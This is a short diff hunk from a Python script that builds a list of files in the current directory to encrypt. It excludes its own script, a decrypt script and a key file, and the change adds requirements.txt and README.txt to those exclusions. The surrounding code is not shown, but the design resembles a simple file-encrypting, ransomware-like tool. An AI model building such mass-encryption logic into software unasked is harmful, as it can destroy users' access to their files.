@@ -8,7 +8,7 @@ for item in os.listdir():
 
 to_encrypt = list()
 for image in image_list:
-    if image == 'main.py' or image == 'decrypt.py' or image == 'thekey.key':
+    if image == 'main.py' or image == 'decrypt.py' or image == 'thekey.key' or image == 'requirements.txt' or image == 'README.txt':
         continue
     else:
         to_encrypt.append(image)
